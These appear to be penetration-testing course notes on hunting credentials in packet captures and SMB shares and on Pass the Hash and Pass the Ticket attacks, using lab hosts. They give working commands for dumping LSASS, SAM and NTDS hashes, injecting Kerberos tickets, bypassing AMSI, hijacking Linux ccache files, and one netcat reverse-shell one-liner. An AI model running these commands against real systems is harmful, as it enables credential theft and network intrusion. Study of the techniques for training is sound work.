* **Hashcat Format Output:** Any extracted NTLM or Kerberos hashes are neatly output in standard **Hashcat layout**, allowing you to pipe them straight into a cracking tool. It uses mode `-m 5500` for NTLMv1, `-m 5600` for NTLMv2, and `-m 7500` for Kerberos.
* **Deduplication:** By default, Pcredz tracks credentials it has already found in memory to keep the log files clean, unless you force it to show duplicates using the verbose (`-v`) flag.

#### Important Command Syntax

* **Scan a specific file:** `./Pcredz -f demo.pcapng -t -v` (Uses the `-t` flag to include timestamps for event tracking, and `-v` for verbose output).
* **Scan a directory recursively:** `./Pcredz -d /path/to/pcap/directory/`.
* **Sniff a live interface:** `sudo ./Pcredz -i eth0`.
* **Deactivate Credit Card scan:** If the credit card regex engine gives you too many false positives on random numerical data, you can toggle it off using the `-c` flag.

### 2. Wireshark Tricks for Credential Hunting

Wireshark is a deeply customizable graphical packet analyzer. To bypass thousands of lines of irrelevant background network noise, you must rely heavily on its display filtering engine.

#### Crucial Filters for Penetration Testers

* **`http.request.method == "POST"`**
  * _The Trick:_ Web applications pass logins via POST requests. When executed over unencrypted HTTP, you can click on these packets, expand the "HTML Form URL Encoded" layer in the middle pane, and read the raw parameter fields (`username=`, `password=`) instantly.
* **`http contains "passw"`**
  * _The Trick:_ This scans the entire HTTP protocol stream layer for text variations containing the string "passw" (matching password, passwd, passw, etc.).
* **`ftp-data`**
  * _The Trick:_ Plain `ftp` filters show command operations (like log-in actions), but `ftp-data` isolates the packets transporting the _actual content_ of downloaded files (like configuration or backup files containing hardcoded credentials).
* **`tcp.stream eq 53`**
  * _The Trick:_ Isolates conversation number 53. This binds scattered network packets back into a cohesive, readable sequential timeline between two hosts.

#### Power-User Workflows

* **The "Find Packet" Feature (`Ctrl + F`):** If you are hunting for a specific target keyword or pattern, navigate to `Edit > Find Packet`. Switch the dropdown configurations to **Packet Bytes** and toggle the format selector to **Regular Expression** or **String**. This allows you to sweep the raw data layer directly.
* **Follow TCP Stream:** Right-click on any interesting unencrypted packet (like an FTP user command or an HTTP request) and select **Follow -> TCP Stream**. This opens a clean window reassembling the entire connection in plaintext (Client actions highlight in red, Server responses in blue).
* **Export Packet Bytes (`Ctrl + H`):** If you identify a raw file binary or cleartext script flowing over an unencrypted stream, highlight that data segment in the middle pane, select `File > Export Packet Bytes`, and save it straight to your disk as a functional local file.

***

***

## Credential Hunting in Network Shares

The provided text outlines the methodologies, common patterns, and automated tools used to discover plaintext credentials, keys, and sensitive configuration files inadvertently left exposed across corporate network shares.

#### 🔑 Common Patterns & Hunting Strategy

Before deploying automated tools, analysts utilize targeted search strategies to filter through massive amounts of data efficiently:

* **Targeted Keywords:** Searching file contents for terms like `passw`, `user`, `token`, `key`, and `secret`.
* **Specific Extensions:** Focusing on configuration, spreadsheet, and script files such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
* **Localization:** Adapting keywords to the target company's language (e.g., searching for "Benutzer" instead of "User" in German environments).
* **Strategic Prioritization:** Focusing heavily on high-value shares (like those used by IT departments) rather than scanning every share, which minimizes time and noise.

#### 🖥️ Windows-Based Automated Tools

When executing checks locally from a Windows environment, the text highlights two primary utilities:

* **Snaffler:** A C# tool designed to run on domain-joined machines. It automatically maps the domain, locates readable shares, and flags interesting files based on preconfigured rules. It provides highly detailed output that requires manual review to filter out false positives.
* **PowerHuntShares:** A PowerShell script that automates host discovery, share enumeration, and permission mapping. It does not strictly require a domain-joined machine and stands out by generating an interactive HTML summary report and structured CSV files for easy analysis.

#### 🐧 Linux-Based Remote Tools

If domain access isn't available locally, operators can spider and search network shares remotely from a Linux attack platform:

* **MANSPIDER:** A remote SMB share crawler best run inside a Docker container to avoid package dependency issues. It searches file content for specific strings and automatically downloads matching files to a local loot directory.
* **NetExec:** A multi-purpose network security utility that includes a specialized `--spider` flag. It allows operators to authenticate remotely and search through specific network shares for precise text patterns directly from the Linux command line.

#### 🔍 Native Manual Hunting (Windows PowerShell)

Before scaling up to advanced utilities, basic native command-line searches can be used to scan targeted shares recursively.

*   **Command Pattern:** PowerShell

    ```
    Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...
    ```
* **Key Filters:** Operators search for file extensions like `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`, or use keywords such as `passw`, `user`, `token`, `key`, and `secret`.

#### 🖥️ Windows Automated Hunting

**1. Snaffler**

A C# executable run locally from a domain-joined machine to automatically map the Active Directory environment and find readable shares containing sensitive data strings.

*   **Baseline Execution:** DOS

    ```
    Snaffler.exe
    ```
* **Refining Parameters:**
  * `-u` : Retrieves a list of users from Active Directory to match against string references in found files.
  * `-i` and `-n` : Allows the operator to specify exactly which shares to include or exclude from the automated search process.

**2. PowerHuntShares**

A PowerShell tool that performs comprehensive subnet pinging, SMB port mapping, and permission enumeration without strictly requiring a domain-joined machine. It generates an interactive HTML dashboard and raw CSV files for review.

*   **Execution Command:** PowerShell

    ```
    Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
    ```

#### 🐧 Linux Remote Hunting

**1. MANSPIDER**

An automated multi-threaded SMB crawler that connects remotely from an attack machine. Running it inside the official Docker image prevents local operating system dependency issues.

*   **Execution Command:** Bash

    ```
    docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
    ```
* **Mechanism:** Authenticates remotely using the provided credentials, matches strings, and downloads matching files to a local loot directory.

**2. NetExec (nxc)**

A robust infrastructure testing framework that features a dedicated `--spider` module to inspect share file structures and contents seamlessly over the network.

*   **Execution Command:** Bash

    ```
    nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pa
    ```

***

***

## Pass the Hash (PtH)

A Pass the Hash attack is a technique allowing an attacker to authenticate to a system using a user's password hash rather than the plaintext password.

* This exploits the Windows NTLM authentication protocol, which does not "salt" passwords on the server side.
* Because the hash remains static until the password is changed, an adversary can use it to verify their identity and start a session directly.

#### Obtaining Hashes

To execute this attack, the attacker must already possess administrative privileges on a compromised machine. Hashes are typically extracted through the following methods:

* Dumping the local SAM database from a compromised host.
* Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
* Pulling the hashes directly from memory using the lsass.exe process.

#### PtH Tools for Windows

The text outlines two primary tools for executing PtH attacks directly from a Windows environment.

**Mimikatz**

* Mimikatz utilizes the `sekurlsa::pth` module to start a new process (such as cmd.exe) under the context of the compromised user's hash.
* It requires specifying the target user, the domain, the NTLM hash, and the program to run.

**Invoke-TheHash**

* This is a collection of PowerShell functions that perform PtH attacks using WMI and SMB connections.
* It does not require local administrator privileges on the client side, but the hash used must have administrative rights on the target computer.
* It can be used to execute commands (like adding a new local administrator) or to trigger a reverse shell connection back to the attacker.

#### PtH Tools for Linux

When attacking from a Linux machine, several post-exploitation frameworks can leverage NTLM hashes.

**Impacket**

* The Impacket toolkit includes scripts like `impacket-psexec`, `impacket-wmiexec`, and `impacket-smbexec`.
* These scripts allow for remote command execution by authenticating with the provided hash.

**NetExec**

* NetExec is used to automate authentication attempts across multiple hosts or subnets.
* It is highly effective for finding local administrator password reuse across a network, a technique also known as password spraying.

**Evil-WinRM**

* This tool uses PowerShell remoting to authenticate and gain a shell on the target.
* It serves as an excellent alternative if standard SMB ports are blocked.

**xfreerdp**

* This tool provides Graphical User Interface (GUI) access to the target system via the Remote Desktop Protocol (RDP).
* To use a hash with RDP, "Restricted Admin Mode" must be explicitly enabled on the target host via a registry key modification

#### 1. Mimikatz (Windows)

**What it does:** Mimikatz is a powerful credential-gathering and exploitation tool. In this context, its `sekurlsa::pth` module is used to perform a Pass the Hash attack by spawning a new process (like a Command Prompt) that runs under the security context of the provided NTLM hash.

**Important Flags/Parameters:**

* `privilege::debug`: A prerequisite command that requests the `SeDebugPrivilege` right, allowing Mimikatz to interact with the local LSASS process memory.
* `/user`: The username of the account you want to impersonate.
* `/rc4` or `/NTLM`: The NTLM hash of the target user's password.
* `/domain`: The domain the user belongs to. For local accounts, you can use the computer name, `localhost`, or a dot (`.`).
* `/run`: The specific program to launch with the injected hash context. If left blank, it defaults to launching `cmd.exe`.

#### 2. Invoke-TheHash (Windows)

**What it does:** This is a collection of PowerShell scripts that execute commands over WMI (Windows Management Instrumentation) or SMB using NTLM hashes. It relies on the .NET `TCPClient` to pass the hash into the NTLMv2 authentication protocol, meaning the client machine does not require local administrative privileges (though the hash being used must have admin rights on the target).

**Important Flags/Parameters:**

* `-Target`: The hostname or IP address of the destination machine.
* `-Username`: The account name to use for authentication.
* `-Domain`: The domain for authentication. This is unnecessary if targeting a local account.
* `-Hash`: The NTLM password hash (accepts either `LM:NTLM` or just `NTLM` formats).
* `-Command`: The specific command or script (like a Base64-encoded reverse shell) to execute on the target.

#### 3. Netcat / `nc.exe` (Windows / Linux)

**What it does:** Netcat is a networking utility used to read and write data across network connections. In the context of the text, it is used as a listener to catch the incoming connection from a reverse shell payload executed by Invoke-TheHash.

**Important Flags:**

* `-l`: Tells Netcat to listen for an incoming connection.
* `-v`: Enables verbose output, providing more details about the connection.
* `-n`: Disables DNS resolution, forcing Netcat to use numeric IP addresses only.
* `-p`: Specifies the local port number to listen on (e.g., `8001`).

#### 4. Impacket Toolkit (Linux)

**What it does:** Impacket is a collection of Python scripts for interacting with Windows network protocols. Tools like `impacket-psexec`, `wmiexec`, `atexec`, and `smbexec` are used to achieve remote command execution on a target machine by authenticating with a hash. For example, `psexec` uploads a random executable to the `ADMIN$` share and creates a temporary Windows service to run it.

**Important Flags/Parameters:**

* `username@target_IP`: The positional argument specifying who to log in as and where to connect.
* `-hashes`: The flag used to pass the hash instead of a password. It requires the format `LM_HASH:NTLM_HASH`. Since LM hashes are often blank or disabled, it is commonly formatted with a leading colon followed by the NTLM hash (e.g., `-hashes :30B3783CE2AB...`).

#### 5. NetExec (Linux)

**What it does:** NetExec is an automated post-exploitation tool used to assess Active Directory environments. It is highly effective for "Password Spraying"—testing a single credential or hash against multiple hosts or an entire subnet to find out where that account has access (especially local administrator access, denoted by the output `Pwn3d!`).

**Important Flags/Parameters:**

* `smb <target>`: Specifies the protocol and the target IP, hostname, or CIDR subnet (e.g., `172.16.1.0/24`).
* `-u`: The target username.
* `-d`: The domain name. Using a dot (`.`) specifies local authentication.
* `-H`: The NTLM hash used for authentication.
* `--local-auth`: Forces the tool to authenticate against the target's local SAM database rather than querying the Active Directory domain.
* `-x`: Executes a specified command on hosts where authentication is successful (e.g., `-x whoami`).

#### 6. Evil-WinRM (Linux)

**What it does:** Evil-WinRM provides an interactive shell on a target machine using PowerShell Remoting (Windows Remote Management). It is an excellent alternative for lateral movement if SMB (port 445) is blocked by a firewall, as WinRM typically operates over ports 5985 (HTTP) or 5986 (HTTPS).

**Important Flags/Parameters:**

* `-i`: The target IP address or hostname.
* `-u`: The username. If using a domain account, the domain must be explicitly included (e.g., `administrator@inlanefreight.htb`).
* `-H`: The NTLM hash used to authenticate the session.

#### 7. xfreerdp (Linux)

**What it does:** xfreerdp is a client for the Remote Desktop Protocol (RDP). It allows an attacker to gain a full Graphical User Interface (GUI) session on the target system using a hash. _Note: This technique requires "Restricted Admin Mode" to be enabled in the target machine's registry._

**Important Flags/Parameters:**

* `/v:`: The IP address or hostname of the target machine.
* `/u:`: The username to authenticate as.
* `/pth:`: The NTLM hash to use for the Pass the Hash login bypass.

#### 1. Mimikatz (Windows)

While `sekurlsa::pth` is used for Pass the Hash, Mimikatz is primarily known for credential extraction.

**Useful Commands & Modules:**

* **`log`**: Starts logging all Mimikatz output to a text file (e.g., `log mimikatz.log`). This is critical so you do not lose extracted hashes if the window closes.
* **`sekurlsa::logonpasswords`**: Dumps all plaintext passwords, Kerberos tickets, and NTLM hashes currently cached in LSASS memory for logged-on users.
* **`lsadump::sam`**: Dumps the local Security Accounts Manager (SAM) database to extract local user hashes (requires `privilege::debug`).
* **`lsadump::lsa /patch`**: Extracts the LSA secrets, which can include plaintext passwords for services, scheduled tasks, or machine accounts.
* **`kerberos::ptt <ticket.kirbi>`**: Performs a Pass the Ticket (PtT) attack by injecting a Kerberos ticket into the current session.

#### 2. Impacket Toolkit (Linux)

Impacket tools (`psexec.py`, `wmiexec.py`, `smbexec.py`, `secretsdump.py`) share a standard set of arguments.

**Example Command (Secretsdump):** `impacket-secretsdump -hashes :30B3783CE2ABF1AF70F77D0660CF3453 administrator@10.129.201.126`

**Useful Flags:**

* **`-dc-ip <IP>`**: Explicitly specifies the IP address of the Domain Controller. This is highly useful if DNS resolution is failing on your attacking machine and the tool cannot find the domain.
* **`-target-ip <IP>`**: Used when you provide a hostname in the connection string but your machine cannot resolve it to an IP address.
* **`-k`**: Uses Kerberos authentication instead of NTLM. You must have a valid Kerberos ticket cached (usually exported via the `KRB5CCNAME` environment variable) for this to work.
* **`-no-pass`**: Tells the tool not to prompt for a password. This is useful when combined with `-k` for pure Kerberos authentication.
* **`-debug`**: Turns on verbose debugging output. This is vital when a connection fails and you need to see exactly which SMB or RPC pipe was denied.

#### 3. NetExec (Linux)

NetExec is unmatched for rapid Active Directory enumeration and data harvesting across subnets.

**Example Command:** `netexec smb 172.16.1.0/24 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --sam`

**Useful Flags:**

* **`--shares`**: Enumerates all SMB shares on the target hosts and displays whether your provided account has Read or Write access to them.
* **`--sam`**: Automatically extracts the local SAM hashes from every machine where your account has local administrator (`Pwn3d!`) access.
* **`--lsa`**: Extracts LSA secrets from the compromised hosts.
* **`--ntds`**: If executed against a Domain Controller, this attempts to dump the entire Active Directory database (NTDS.dit), capturing all domain user hashes.
* **`--sessions`**: Enumerates active user sessions on the target machines to see who is currently logged in.
* **`--pass-pol`**: Retrieves the domain password policy (complexity requirements, lockout thresholds) without needing administrative credentials.

#### 4. Evil-WinRM (Linux)

Evil-WinRM is built specifically for PowerShell remoting and has built-in features to bypass execution restrictions.

**Example Command:** `evil-winrm -i 10.129.201.126 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 -s /opt/scripts/`

**Useful Flags:**

* **`-s <path>`**: Specifies a local directory on your attacking machine that contains `.ps1` PowerShell scripts. Once connected, you can type `menu` to see and load these scripts directly into memory on the target, bypassing disk-based antivirus.
* **`-e <path>`**: Specifies a local directory containing `.exe` binaries. Evil-WinRM allows you to execute these binaries directly in memory on the target via the `Bypass-4MSI` command.
* **`--ssl`**: Forces the connection over HTTPS (port 5986) instead of HTTP (port 5985), which is required if the target environment enforces encrypted WinRM.

#### 5. xfreerdp (Linux)

xfreerdp is highly customizable for bypassing network restrictions and making GUI interactions smoother.

**Example Command:** `xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /cert:ignore /clipboard /dynamic-resolution`

**Useful Flags:**

* **`/cert:ignore`**: Automatically ignores SSL/TLS certificate warnings. This is almost always required in lab environments or internal networks where self-signed certificates are used.
* **`/clipboard`**: Enables clipboard synchronization, allowing you to copy text from your attacking Linux machine and paste it directly into the remote Windows GUI.
* **`/drive:<name>,<path>`**: Mounts a local directory from your attacking machine as a network drive inside the RDP session. For example, `/drive:kali,/tmp` will make your `/tmp` folder appear as a mapped drive in the Windows session, allowing for easy file transfers.
* **`/dynamic-resolution`**: Allows the RDP window to scale automatically when you resize it on your host machine.

#### 6. Netcat (Windows / Linux)

Beyond setting up listeners, Netcat is a versatile raw TCP/UDP handler.

**Example Command:** `nc -nv -w 3 -z 10.129.201.126 1-1000`

**Useful Flags:**

* **`-z`**: Zero-I/O mode, used strictly for port scanning. In the example above, it scans ports 1 through 1000 on the target.
* **`-w <seconds>`**: Specifies a timeout for connections. Useful when port scanning or connecting to unstable targets so it doesn't hang indefinitely.
* **`-u`**: Specifies UDP mode instead of the default TCP protocol.
* **`-e <executable>`**: Binds an executable to the connection. For example, `-e /bin/bash` (Linux) or `-e cmd.exe` (Windows) will execute the shell and send the input/output across the network. _Note: The `-e` flag is stripped from the default Netcat version on many modern Linux distributions for security reasons, often requiring a specialized payload (like `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`) to achieve the same result._

#### Core Comparison Summary

| **Feature**                | **Mimikatz (sekurlsa::pth)**                                                     | **Invoke-TheHash (Invoke-WMIExec)**                                                    |
| -------------------------- | -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| **Execution Focus**        | **Local:** Spawns a token-injected process on your current machine.              | **Remote:** Executes a command directly on a target machine over the network.          |
| **Local Admin Required?**  | **Yes:** Must be able to run `privilege::debug` to interact with LSASS.          | **No:** Does not require administrator rights on the client machine you are typing on. |
| **Target Admin Required?** | **N/A:** You are authenticating locally first, then accessing network resources. | **Yes:** The hash used must have administrative rights on the remote machine.          |
| **Interaction Type**       | **Interactive:** Opens a new, live command prompt (`cmd.exe`) window.            | **Non-Interactive:** Runs a single command or payload string remotely.                 |
| **Underlying Protocol**    | Local LSASS memory manipulation via security modules.                            | Network-based NTLMv2 authentication over `.NET TCPClient` via WMI.                     |

***

***

## Pass the Ticket (PtT) From Windows

* **The Shift:** Instead of using an NTLM password hash to authenticate across the network, a PtT attack utilizes a captured Kerberos ticket (either a TGT or a specific TGS).
* **The Advantage:** Kerberos tickets are natively processed and trusted by Active Directory. Once a valid ticket is placed into a session's memory cache, the operating system handles authentication automatically without prompting for a password.

#### 2. Harvesting and Exporting Tickets

Because tickets are stored inside the volatile memory space of the **LSASS (Local Security Authority Subsystem Service)** process, local administrative privileges are required to extract them from other user sessions. The text details two ways to export these:

* **Mimikatz (`sekurlsa::tickets /export`):** Extracts cached tickets and writes them to the local disk as individual files with a **`.kirbi`** extension.
* **Rubeus (`Rubeus.exe dump /nowrap`):** Scans memory and outputs the ticket data directly to the terminal screen formatted as a continuous **Base64 string**.

#### 3. Importing and Passing the Ticket

Once a ticket is acquired, it must be injected into the current command shell's logon session memory to be used. The text highlights three native ways to achieve this import:

* **Via Rubeus (File):** `Rubeus.exe ptt /ticket:<filename>.kirbi`.
* **Via Rubeus (Base64):** `Rubeus.exe ptt /ticket:<Base64_String>`.
* **Via Mimikatz (File):** `kerberos::ptt "C:\path\to\file.kirbi"`.

### 1. Exporting & Harvesting Commands

These commands are used to gather Kerberos tickets or encryption keys from the local system memory (LSASS).

#### Mimikatz: Ticket Export

DOS

```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

#### Rubeus: Ticket Dump

DOS

```
Rubeus.exe dump /nowrap
```

#### Mimikatz: Extract Encryption Keys (OverPass the Hash Prerequisite)

DOS

```
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

#### New Flags Breakdown (Export Phase)

* **`/export` (Mimikatz):** Instructs the `sekurlsa::tickets` module to write every discovered ticket from memory onto the local disk as a separate `.kirbi` file.
* **`/nowrap` (Rubeus):** Forces the Base64 output of the ticket data to be displayed as a single, continuous line in the terminal. This prevents word-wrapping or truncation, making it easy to copy and paste.

### 2. Attacking Commands (Pass the Ticket / Pass the Key)

These commands inject a stolen ticket into the current logon session or exchange an NTLM/AES hash for a valid Ticket Granting Ticket (TGT).

#### Mimikatz: OverPass the Hash (Pass the Key)

DOS

```
mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f" exit
```

#### Rubeus: OverPass the Hash via AES-256 Key

DOS

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

#### Rubeus: Ask TGT and Pass it Automatically

DOS

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

#### Rubeus: Pass the Ticket via `.kirbi` File

DOS

```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Rubeus: Pass the Ticket via Base64 String

DOS

```
Rubeus.exe ptt /ticket:<Base64_String_Here>
```

#### Mimikatz: Pass the Ticket via `.kirbi` File

DOS

```
mimikatz.exe "privilege::debug" "kerberos::ptt C:\path\to\ticket.kirbi" exit
```

#### New Flags Breakdown (Attack Phase)

* **`asktgt` (Rubeus Module):** Requests a new Ticket Granting Ticket (TGT) directly from the Domain Controller by providing a user account hash rather than a plaintext password.
* **`/aes256:` / `/rc4:` (Rubeus):** Specifies the type of encryption key/hash being supplied to authenticate the request to the Key Distribution Center (KDC).
* **`/ntlm:` (Mimikatz):** The equivalent parameter in Mimikatz used to supply the password hash during a process injection step.
* **`ptt` (Rubeus Module) / `kerberos::ptt` (Mimikatz Module):** Stands for "Pass the Ticket." It tells the tool to take an external ticket file or string and inject it into the volatile memory cache of the active logon session.
* **`/ticket:` (Rubeus):** Specifies the input source for a ticket injection. It accepts either a direct path to a physical `.kirbi` file or a raw Base64-encoded credential string.

### 3. Getting a Shell & Lateral Movement Commands

These commands allow an administrative session to move from the local workstation (`MS01`) to execute a shell on the target machine (`DC01`).

#### Rubeus: Sacrificial Session Creation (Logon Type 9)

DOS

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

#### PowerShell: Connect Natively via PowerShell Remoting (WinRM)

PowerShell

```
Enter-PSSession -ComputerName DC01
```

#### New Flags Breakdown (Shell Phase)

* **`createnetonly` (Rubeus Module):** Creates a completely separate, isolated logon session on your local host utilizing `LOGON_TYPE = 9` (NewCredentials). This tricks Windows into pointing all local traffic to your current user profile while reserving the network routing path specifically for the identity you are about to inject. This ensures that importing a new TGT does not accidentally overwrite or corrupt your existing system tokens.
* **`/program:` (Rubeus):** Defines the exact executable window context to open inside the new network session (typically `cmd.exe`).
* **`/show` (Rubeus):** Forces the new process window to physically pop up on your screen. If omitted, the sacrificial session will run entirely invisible in the background.
* **`Enter-PSSession` (PowerShell Native):** Opens an interactive, real-time cryptographic remote management terminal session over Windows Remote Management (WinRM) to the computer name specified by the `-ComputerName` parameter

***

***

## Pass the Ticket (PtT) From Linux

### Part 1: Architecture & Theory

#### Linux-Active Directory Integration

Modern enterprise networks often join Linux servers (web servers, databases, dev boxes) to a Windows Active Directory domain to achieve centralized identity management.

* This bridge relies on background daemons like **SSSD** (System Security Services Daemon) or **Winbind** to map Windows security identifiers (SIDs) to Linux user/group IDs (UIDs/GIDs).
* Authentication is handled via **Kerberos**. A domain user logging into a Linux box goes through the exact same authentication exchange with the Domain Controller (Key Distribution Center/KDC) as they would on a Windows workstation.

#### Kerberos Storage Mechanism on Linux

Unlike Windows, which tightly guards Kerberos tickets inside the protected memory space of the Local Security Authority Subsystem Service (`LSASS`), Linux handles and stores tickets as physical files:

**1. Credential Cache (`ccache`) Files**

* **What they are:** Temporary binary files that hold active Kerberos tokens (TGTs and TGSs) for currently logged-in domain sessions.
* **Where they live:** By default, they are dropped into the volatile memory partition at `/tmp/`. They are dynamically named using the format: `krb5cc_[UID]_[RandomString]`.
* **Access Control:** Under normal operations, a `ccache` file is strictly read/write restricted to the exact Linux user ID it belongs to. However, if an attacker elevates privileges to **root**, these file permissions become irrelevant, and _any_ active token can be copied and hijacked.

**2. Keytab (`.keytab`) Files**

* **What they are:** Cryptographic static files containing pairs of Kerberos principal names and encrypted keys derived directly from the account’s password.
* **Why they are used:** They eliminate the need for a human to type a password. Administrators use keytabs to let automated services, system backup processes, or cronjobs silently authenticate against network objects.
* **Risk Factor:** Keytab files are static. If an administrator leaves a keytab file world-readable, or if an attacker acquires root access, the keytab can be pulled offline to extract raw NTLM or AES-256 password hashes.

### 🛠️ Part 2: Tool Arsenal Cheat Sheet

This matrix details the primary applications utilized during a Linux-based Pass-the-Ticket or Pass-the-Key campaign:

| **Tool Category** | **Tool Name**     | **Tactical Operational Objective**                                                                                                       |
| ----------------- | ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **System Native** | `realm list`      | Identifies domain configurations, enrollment type, and allowed domain groups.                                                            |
| **System Native** | `klist` / `kinit` | Native binaries used to view active environment tickets or initialize a TGT via a keytab file.                                           |
| **Pivoting**      | `chisel`          | An HTTP/SOCKS5 reverse proxy wrapper used to establish communication out of a blind internal network.                                    |
| **Pivoting**      | `proxychains`     | Intercepts tool network commands locally and routes them through the established Chisel tunnel.                                          |
| **Exploitation**  | `KeyTabExtract`   | A parsing tool designed to carve out structural cryptographic hashes (NTLM/AES) out of binary keytabs.                                   |
| **Exploitation**  | `Linikatz`        | A comprehensive automated bash framework that sweeps system layouts to dump all Kerberos secrets and memory caches simultaneously.       |
| **Exploitation**  | `impacket suite`  | A framework containing offensive tools (like `wmiexec` or `ticketConverter`) to interact with AD objects using stolen tickets or hashes. |
| **Exploitation**  | `Evil-WinRM`      | An advanced shell framework providing persistent remote execution over the WinRM protocol using Kerberos tokens.                         |
| **Exploitation**  | `Rubeus`          | A C# Swiss-army knife executed on Windows platforms to interactively pass converted Linux tickets (`.kirbi`) straight into local memory. |

### ⚔️ Part 3: Operational Command Reference Checklist

#### Phase 1: Environment Enumeration

Verify domain enrollment status and confirm authentication hooks are active:

Bash

```
# Analyze Active Directory configuration and permission rules
realm list

# Scan the active system process architecture for operational AD components
ps -ef | grep -i "winbind\|sssd"
```

#### Phase 2: Post-Exploitation Credential Hunting

Scour the disk structure to isolate hidden configuration files and session caches:

Bash

```
# Locate keytab extensions globally while discarding permission errors
find / -name *keytab* -ls 2>/dev/null

# Review user cron profiles to intercept automated automation scripts
crontab -l

# Check active environment mappings for the Kerberos cache configuration path
env | grep -i krb5

# Enumerate the temporary directory to locate raw ccache allocations
ls -la /tmp
```

#### Phase 3: Ticket / Key Extraction and Abuse

Load discovered tokens or break open static keys to pivot laterally:

Bash

```
# Interrogate a keytab file to isolate the principal owner name
klist -k -t /opt/specialfiles/carlos.keytab

# Initialize a network TGT by passing the keytab principal directly
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Map the raw contents of a keytab file into distinct cryptographic hashes
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

#### Phase 4: Stolen Session Hijacking (Pass-the-Ticket)

As root, capture and inject a high-privilege session (e.g., Domain Admin) to control the environment:

Bash

```
# 1. Duplicate the target user's ticket file to a clean working directory
cp /tmp/krb5cc_647401106_I8I133 /root/

# 2. Re-route the system's Kerberos environment target pointer
export KRB5CCNAME=/root/krb5cc_647401106_I8I133

# 3. Confirm the system actively reflects the hijacked identity
klist

# 4. Target the Windows Domain Controller administrative root share via Kerberos
smbclient //dc01/C$ -k -c ls -no-pass
```

#### Phase 5: Cross-Platform Conversion Operations

Bridge the gap between Linux (`ccache`) and Windows (`kirbi`) ticket formats:

Bash

```
# Convert a Linux cache file to a Windows-compatible ticket structure
impacket-ticketConverter krb5cc_647401106_I8I133 admin_session.kirbi

# In Windows, pass the converted ticket into your active LSASS memory slot
Rubeus.exe ptt /ticket:c:\tools\admin_session.kirbi
```

***

***
